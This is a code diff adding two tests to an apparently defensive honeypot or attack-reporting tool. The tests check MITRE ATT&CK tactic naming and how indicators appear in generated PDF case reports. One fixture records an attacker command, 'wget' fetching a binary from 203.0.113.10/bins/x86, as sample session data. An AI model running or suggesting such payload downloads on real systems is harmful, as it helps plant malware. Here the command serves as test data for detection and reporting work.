@@ -251,3 +251,31 @@ def test_validation_counts_what_each_gate_checked():
     result = validate_reply(json.dumps(reply), packet)
     # Two addresses: the source, and the host inside the URL.
     assert result["validation"] == {"addresses": 2, "urls": 1, "references": 4, "citations": 1, "findings": 1}
+
+
+def test_tactics_come_from_the_mappers_attack_catalog():
+    from app.ai.attack_catalog import catalog
+    from app.services.report_analytics import TACTIC_NAMES, TACTICS
+
+    catalog.load()
+    assert [t for t, _ in TACTICS] == [t["id"] for t in catalog.tactics]
+    # A tactic the catalog has and the classic list did not: no raw ids in the report.
+    assert TACTIC_NAMES["TA0112"] == "Defense Impairment"
+    records = [(session("a"), analysis("exploitation", mitre={"techniques": [
+        {"id": "T1222.002", "name": "Linux and Mac Permissions", "source": "rule:make_executable", "tactics": ["TA0112"]},
+    ]}))]
+    assert threat_assessment(records)["tactics"] == ["TA0112"]
+
+
+def test_case_lists_each_indicator_once_and_uuids_fit_one_line():
+    records = [
+        (session(f"{i:08d}-aaaa-bbbb-cccc-{i:012d}", started=f"2026-11-11T12:0{i}:00+00:00"),
+         analysis("exploitation", commands="wget http://203.0.113.10/bins/x86",
+                  iocs=[{"type": "url", "value": "http://203.0.113.10/bins/x86", "first_seen": f"2026-11-11T12:0{i}:00"}]))
+        for i in range(3)
+    ]
+    text = "\n".join(pdf_pages(generate_pdf_report(records, "pdf", narrative_for(records), False, META)))
+    # The case page: the last time its title appears (the first is the contents).
+    case = text[text.rindex("E1 / SSH / exploitation"):text.rindex("Report generation record")]
+    assert case.count("http://203.0.113.10/bins/x86") == 2  # the command line and one indicator row
+    assert "00000002-aaaa-bbbb-cccc-000000000002" in text
